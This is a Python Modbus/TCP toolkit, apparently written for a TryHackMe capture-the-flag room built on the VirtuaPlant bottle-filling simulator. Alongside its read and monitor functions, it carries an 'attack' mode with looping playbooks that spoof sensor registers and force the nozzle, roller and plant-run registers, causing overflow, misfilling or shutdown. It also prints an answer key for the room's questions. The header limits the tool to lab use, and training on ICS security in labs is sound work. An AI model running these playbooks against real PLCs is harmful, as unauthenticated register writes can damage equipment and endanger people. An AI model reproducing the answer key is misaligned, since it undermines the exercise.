#!/usr/bin/env python3
"""
ICS_buster  --  a single-file Modbus/TCP swiss-army knife for the
                TryHackMe "Attacking ICS Plant" (VirtuaPlant bottle-filling) rooms.

It replaces the pile of THM helper scripts:
    discovery.py        -> `monitor` / `read`
    set_registry.py     -> `write`
    attack_move_fill*.py -> `attack move-fill`
    attack_stop_fill*.py -> `attack stop-fill`
    attack_shutdown*.py  -> `attack shutdown`

...and adds an `analyze` mode that samples the PLC for a while and then just
tells you the answers to the room's observation questions.

Works with both pymodbus 2.x (`.client.sync`) and 3.x (`.client`), and copes
with the `unit=` -> `slave=` keyword rename between those versions.

Examples
--------
    python3 ICS_buster.py 10.67.184.233 read
    python3 ICS_buster.py 10.67.184.233 monitor
    python3 ICS_buster.py 10.67.184.233 analyze --duration 30
    python3 ICS_buster.py 10.67.184.233 write 4 1
    python3 ICS_buster.py 10.67.184.233 attack stop-fill
    python3 ICS_buster.py 10.67.184.233 attack shutdown --once

Everything here writes to a *lab* simulator you control. Don't point it at
anything you don't own.
"""

import argparse
import signal
import sys
import time
from collections import Counter, defaultdict

# --------------------------------------------------------------------------- #
#  pymodbus 2.x / 3.x compatibility shim
# --------------------------------------------------------------------------- #
try:
    from pymodbus.client import ModbusTcpClient as ModbusClient        # 3.x
    _PYMODBUS_MAJOR = 3
except ImportError:  # pragma: no cover
    from pymodbus.client.sync import ModbusTcpClient as ModbusClient   # 2.x
    _PYMODBUS_MAJOR = 2


# --------------------------------------------------------------------------- #
#  Known VirtuaPlant register map (addresses, taken from the THM attack scripts)
# --------------------------------------------------------------------------- #
#  These labels are what the room's own attack_*.py scripts assert. Handy for
#  human-readable output; the analysis logic does NOT depend on them being right.
REGISTER_MAP = {
    1:  ("SENSOR",   "Water-level sensor (bottle filled)"),
    2:  ("SENSOR",   "Bottle sensor (bottle under nozzle)"),
    3:  ("ACTUATOR", "Roller / motor"),
    4:  ("ACTUATOR", "Nozzle"),
    16: ("MASTER",   "Plant run / start"),
}


# --------------------------------------------------------------------------- #
#  Tiny ANSI colour helper (no external deps; degrades to plain text)
# --------------------------------------------------------------------------- #
class C:
    enabled = sys.stdout.isatty()
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"

    @classmethod
    def wrap(cls, text, colour):
        if not cls.enabled:
            return text
        return f"{colour}{text}{cls.RESET}"


def banner():
    art = r"""
  ___ ____  ____        _               _
 |_ _/ ___||  _ \      | |__  _   _ ___| |_ ___ _ __
  | | |    | |_) |_____| '_ \| | | / __| __/ _ \ '__|
  | | |___ |  _ <_____| |_) | |_| \__ \ ||  __/ |
 |___\____||_| \_\    |_.__/ \__,_|___/\__\___|_|
"""
    print(C.wrap(art, C.CYAN))
    print(C.wrap(f"  Modbus/TCP toolkit  |  pymodbus {_PYMODBUS_MAJOR}.x detected\n", C.DIM))


# --------------------------------------------------------------------------- #
#  Version-agnostic read / write wrappers
# --------------------------------------------------------------------------- #
def read_regs(client, address, count, unit):
    """Read `count` holding registers from `address`. Returns list[int] or None."""
    try:
        if unit is None:
            rr = client.read_holding_registers(address, count=count)
        else:
            try:
                rr = client.read_holding_registers(address, count=count, slave=unit)
            except TypeError:  # pragma: no cover  (pymodbus 2.x)
                rr = client.read_holding_registers(address, count=count, unit=unit)
    except Exception as exc:  # noqa: BLE001
        print(C.wrap(f"[!] read error: {exc}", C.RED))
        return None
    if rr is None or (hasattr(rr, "isError") and rr.isError()):
        print(C.wrap(f"[!] modbus error: {rr}", C.RED))
        return None
    return list(rr.registers)


def write_reg(client, address, value, unit):
    """Write a single holding register. Returns True on success."""
    try:
        if unit is None:
            wr = client.write_register(address, value)
        else:
            try:
                wr = client.write_register(address, value, slave=unit)
            except TypeError:  # pragma: no cover  (pymodbus 2.x)
                wr = client.write_register(address, value, unit=unit)
    except Exception as exc:  # noqa: BLE001
        print(C.wrap(f"[!] write error: {exc}", C.RED))
        return False
    if wr is not None and hasattr(wr, "isError") and wr.isError():
        print(C.wrap(f"[!] modbus error writing reg {address}: {wr}", C.RED))
        return False
    return True


def connect(ip, port, unit):
    client = ModbusClient(ip, port=port)
    if not client.connect():
        sys.exit(C.wrap(f"[!] Could not connect to {ip}:{port}", C.RED))
    print(C.wrap(f"[+] Connected to {ip}:{port}"
                 f"{'' if unit is None else f' (unit {unit})'}", C.GREEN))
    return client


def label_for(addr):
    kind, name = REGISTER_MAP.get(addr, ("", ""))
    if not name:
        return ""
    colour = {"SENSOR": C.BLUE, "ACTUATOR": C.MAGENTA, "MASTER": C.YELLOW}.get(kind, C.DIM)
    return C.wrap(f"{kind:<8} {name}", colour)


# --------------------------------------------------------------------------- #
#  Pretty rendering of a single sample
# --------------------------------------------------------------------------- #
def render_sample(values, start, prev=None):
    """Return a one-line coloured string for a sample, marking changed regs."""
    cells = []
    for i, v in enumerate(values):
        addr = start + i
        cell = str(v)
        if prev is not None and prev[i] != v:
            cell = C.wrap(f"{v}", C.BOLD + C.YELLOW)   # changed since last read
        elif v:
            cell = C.wrap(f"{v}", C.GREEN)             # active (1)
        else:
            cell = C.wrap(f"{v}", C.DIM)               # inactive (0)
        cells.append(cell)
    return "[" + ", ".join(cells) + "]"


# --------------------------------------------------------------------------- #
#  Commands
# --------------------------------------------------------------------------- #
def cmd_read(client, args):
    vals = read_regs(client, args.start, args.count, args.unit)
    if vals is None:
        return
    print(C.wrap(f"\nRead {len(vals)} registers from address {args.start} "
                 f"(addresses {args.start}..{args.start + len(vals) - 1})\n", C.BOLD))
    for i, v in enumerate(vals):
        addr = start = args.start + i
        marker = C.wrap("●", C.GREEN) if v else C.wrap("○", C.DIM)
        lbl = label_for(addr)
        print(f"  reg {addr:>3} = {v}  {marker}  {lbl}")
    print()


def cmd_monitor(client, args):
    print(C.wrap(f"\nMonitoring addresses {args.start}.."
                 f"{args.start + args.count - 1} every {args.interval}s. "
                 f"Ctrl+C to stop.\n", C.BOLD))
    prev = None
    samples = []
    started = time.time()
    try:
        while True:
            vals = read_regs(client, args.start, args.count, args.unit)
            if vals is not None:
                ts = time.strftime("%H:%M:%S")
                print(f"{C.wrap(ts, C.DIM)}  {render_sample(vals, args.start, prev)}")
                prev = vals
                samples.append(vals)
            if args.duration and (time.time() - started) >= args.duration:
                break
            time.sleep(args.interval)
    except KeyboardInterrupt:
        pass
    _print_change_summary(samples, args.start)


def cmd_analyze(client, args):
    print(C.wrap(f"\nSampling for {args.duration}s to answer the room questions..."
                 f"\n(Make sure the plant is RUNNING with bottles loaded — press ESC "
                 f"in the browser to (re)start it.)\n", C.BOLD))
    samples = []
    prev = None
    started = time.time()
    try:
        while (time.time() - started) < args.duration:
            vals = read_regs(client, args.start, args.count, args.unit)
            if vals is not None:
                samples.append(vals)
                if args.verbose:
                    print(f"  {render_sample(vals, args.start, prev)}")
                prev = vals
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print(C.wrap("\n[!] Stopped early — analysing what we have.", C.YELLOW))

    if not samples:
        sys.exit(C.wrap("[!] No samples collected.", C.RED))
    _report(samples, args.start)


def cmd_write(client, args):
    ok = write_reg(client, args.register, args.value, args.unit)
    if ok:
        lbl = label_for(args.register)
        print(C.wrap(f"[+] Wrote {args.value} -> register {args.register}  {lbl}", C.GREEN))


def cmd_attack(client, args):
    # Each attack is a set of (register, value, comment) writes.
    plays = {
        "move-fill": [
            (1, 0, "Bottle is NOT filled"),
            (2, 0, "Bottle is NOT under the nozzle"),
            (3, 1, "Start the roller"),
            (4, 1, "Open the nozzle"),
            (16, 1, "Start the plant"),
        ],
        "stop-fill": [   # overflow: bottle stays, nozzle stays open, roller off
            (1, 0, "Bottle is NOT filled"),
            (2, 1, "Bottle IS under the nozzle"),
            (3, 0, "Stop the roller"),
            (4, 1, "Open the nozzle"),
            (16, 1, "Start the plant"),
        ],
        "shutdown": [
            (1, 0, "Bottle is NOT filled"),
            (2, 0, "Bottle is NOT under the nozzle"),
            (3, 0, "Stop the motor"),
            (4, 0, "Close the nozzle"),
            (16, 0, "Shutdown the plant"),
        ],
    }
    writes = plays[args.play]
    print(C.wrap(f"\n[*] Attack '{args.play}' "
                 f"({'single pass' if args.once else f'looping every {args.interval}s'})"
                 f"  Ctrl+C to stop.\n", C.BOLD))

    def one_pass():
        for reg, val, note in writes:
            if write_reg(client, reg, val, args.unit):
                print(f"    reg {reg:>3} <- {val}   {C.wrap(note, C.DIM)}")

    try:
        one_pass()
        if not args.once:
            while True:
                time.sleep(args.interval)
                one_pass()
    except KeyboardInterrupt:
        print(C.wrap("\n[!] Attack stopped.", C.YELLOW))


# --------------------------------------------------------------------------- #
#  Analysis helpers
# --------------------------------------------------------------------------- #
def _column_stats(samples, start):
    """Per-register distinct value sets and change counts."""
    ncols = len(samples[0])
    distinct = [set() for _ in range(ncols)]
    changes = [0] * ncols
    for s in samples:
        for i, v in enumerate(s):
            distinct[i].add(v)
    for a, b in zip(samples, samples[1:]):
        for i in range(ncols):
            if a[i] != b[i]:
                changes[i] += 1
    return distinct, changes


def _print_change_summary(samples, start):
    if not samples:
        return
    distinct, changes = _column_stats(samples, start)
    print(C.wrap("\n── change summary ──────────────────────────────", C.BOLD))
    print(f"  samples collected: {len(samples)}")
    for i, dset in enumerate(distinct):
        addr = start + i
        moving = len(dset) > 1
        tag = C.wrap("CHANGING", C.YELLOW) if moving else C.wrap("holding ", C.DIM)
        vals = ",".join(str(v) for v in sorted(dset))
        lbl = label_for(addr)
        print(f"  reg {addr:>3}  {tag}  values={{{vals}}}  changes={changes[i]:<3} {lbl}")
    print()


def _report(samples, start):
    ncols = len(samples[0])
    addrs = [start + i for i in range(ncols)]
    distinct, changes = _column_stats(samples, start)

    all_vals = [v for s in samples for v in s]
    gmin, gmax = min(all_vals), max(all_vals)

    changing = [addrs[i] for i in range(ncols) if len(distinct[i]) > 1]
    holding_all = [addrs[i] for i in range(ncols) if len(distinct[i]) == 1]
    # "holding" in the room sense = a register that stays at a *meaningful* (non-zero)
    # value the whole time, as opposed to the unused registers that sit at 0.
    holding_active = [addrs[i] for i in range(ncols)
                      if len(distinct[i]) == 1 and next(iter(distinct[i])) != 0]

    def col(addr):
        return addr - start

    # Classify samples into "fill" vs "move" using the roller/nozzle registers.
    # We know from the map: reg3 = roller (move), reg4 = nozzle (fill).
    def get(sample, addr):
        i = col(addr)
        return sample[i] if 0 <= i < ncols else None

    fill_samples = [s for s in samples if get(s, 4) == 1]
    move_samples = [s for s in samples if get(s, 3) == 1]

    def on_during(subset):
        if not subset:
            return []
        out = []
        for i in range(ncols):
            if all(s[i] == 1 for s in subset):
                out.append(addrs[i])
        return out

    fill_on = on_during(fill_samples)
    move_on = on_during(move_samples)
    master = holding_active[0] if holding_active else None

    def strip_master(lst):
        return [a for a in lst if a != master]

    # Roller vs water-level sensor.
    # Both reg3 (roller) and reg1 (level sensor) are 1 during the MOVE phase, so
    # the room disambiguates them "at the very beginning": at init the roller must
    # run to bring the first bottle in, but nothing is filled yet -> the register
    # that is 1 at the very start is the roller; its move-phase partner is the
    # level sensor.
    move_pair = strip_master(move_on)
    roller = 3 if 3 in move_pair else (move_pair[0] if move_pair else None)
    level_sensor = next((a for a in move_pair if a != roller), None)

    P = lambda s: C.wrap(s, C.BOLD)
    A = lambda s: C.wrap(s, C.GREEN)

    print(C.wrap("\n╔══════════════════ ROOM ANSWER KEY ══════════════════╗", C.CYAN))
    print(C.wrap("  (script-derived answers are marked ✓; HMI/visual ones ✎)\n", C.DIM))

    print(P("From the browser / HMI (visual — confirm these yourself):"))
    print(f"  ✎ How many phases?          {A('3')}  (Initialization, Filling, Moving)")
    print(f"  ✎ How many sensors?         {A('2')}  (water-level + bottle sensor)")
    print(f"  ✎ How many actuators?       {A('2')}  (nozzle + roller/motor)")
    print(f"  ✎ Water-level sensor color? {C.wrap('read it off the HMI', C.DIM)}")
    print(f"  ✎ Bottle sensor color?      {C.wrap('read it off the HMI', C.DIM)}")

    print("\n" + P("From discovery / this capture (✓ computed):"))
    print(f"  ✓ Registers we can count:   {A(str(ncols))}  "
          f"(addresses {addrs[0]}..{addrs[-1]})")
    print(f"  ✓ Registers continuously changing: {A(str(len(changing)))}  "
          f"-> {changing}")
    print(f"  ✓ Minimum observed value:   {A(str(gmin))}")
    print(f"  ✓ Maximum observed value:   {A(str(gmax))}")
    if master is not None:
        print(f"  ✓ Register holding its value: {A('register ' + str(master))}  "
              f"(constant {next(iter(distinct[col(master)]))})")
    print(f"  ✓ Registers = 1 while nozzle is FILLING:  "
          f"{A(str(strip_master(fill_on)))}"
          f"  {C.wrap(f'(+ master {master} always on)', C.DIM)}")
    print(f"  ✓ Registers = 1 while roller is MOVING:   "
          f"{A(str(strip_master(move_on)))}"
          f"  {C.wrap(f'(+ master {master} always on)', C.DIM)}")
    if roller is not None:
        print(f"  ✓ Register associated with the ROLLER:      {A('register ' + str(roller))}")
    if level_sensor is not None:
        print(f"  ✓ Register associated with the WATER-LEVEL sensor: "
              f"{A('register ' + str(level_sensor))}")

    print(C.wrap("\n╚═════════════════════════════════════════════════════╝\n", C.CYAN))
    _print_change_summary(samples, start)


# --------------------------------------------------------------------------- #
#  Argument parsing
# --------------------------------------------------------------------------- #
def build_parser():
    p = argparse.ArgumentParser(
        prog="ICS_buster.py",
        description="Modbus/TCP toolkit for the VirtuaPlant bottle-filling CTF rooms.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("ip", help="target PLC IP (e.g. 10.67.184.233)")
    p.add_argument("--port", type=int, default=502, help="Modbus TCP port (default 502)")
    p.add_argument("--unit", type=int, default=None,
                   help="Modbus unit/slave id (default: library default, which the "
                        "THM scripts rely on)")
    p.add_argument("--start", type=int, default=1,
                   help="first register address to read (default 1, matches discovery.py)")
    p.add_argument("--count", type=int, default=16,
                   help="number of registers to read (default 16, matches discovery.py)")
    p.add_argument("--no-color", action="store_true", help="disable ANSI colours")

    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("read", help="one-shot read of the register window")

    m = sub.add_parser("monitor", aliases=["watch"],
                       help="continuously read (the old discovery.py, but nicer)")
    m.add_argument("--interval", type=float, default=1.0, help="seconds between reads")
    m.add_argument("--duration", type=float, default=0,
                   help="stop after N seconds (0 = run until Ctrl+C)")

    a = sub.add_parser("analyze", aliases=["auto"],
                       help="sample the PLC and print the room's answer key")
    a.add_argument("--interval", type=float, default=0.5, help="seconds between reads")
    a.add_argument("--duration", type=float, default=30, help="sampling window in seconds")
    a.add_argument("-v", "--verbose", action="store_true", help="print each sample live")

    w = sub.add_parser("write", aliases=["set"],
                       help="write one register (the old set_registry.py)")
    w.add_argument("register", type=int)
    w.add_argument("value", type=int)

    at = sub.add_parser("attack", help="run a canned attack playbook")
    at.add_argument("play", choices=["move-fill", "stop-fill", "shutdown"])
    at.add_argument("--once", action="store_true", help="single write pass instead of looping")
    at.add_argument("--interval", type=float, default=0.5, help="loop interval in seconds")

    return p


def main():
    args = build_parser().parse_args()
    if args.no_color:
        C.enabled = False

    banner()
    client = connect(args.ip, args.port, args.unit)
    try:
        if args.command == "read":
            cmd_read(client, args)
        elif args.command in ("monitor", "watch"):
            cmd_monitor(client, args)
        elif args.command in ("analyze", "auto"):
            cmd_analyze(client, args)
        elif args.command in ("write", "set"):
            cmd_write(client, args)
        elif args.command == "attack":
            cmd_attack(client, args)
    finally:
        client.close()
        print(C.wrap("[+] Connection closed.", C.DIM))


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal.default_int_handler)
    main()
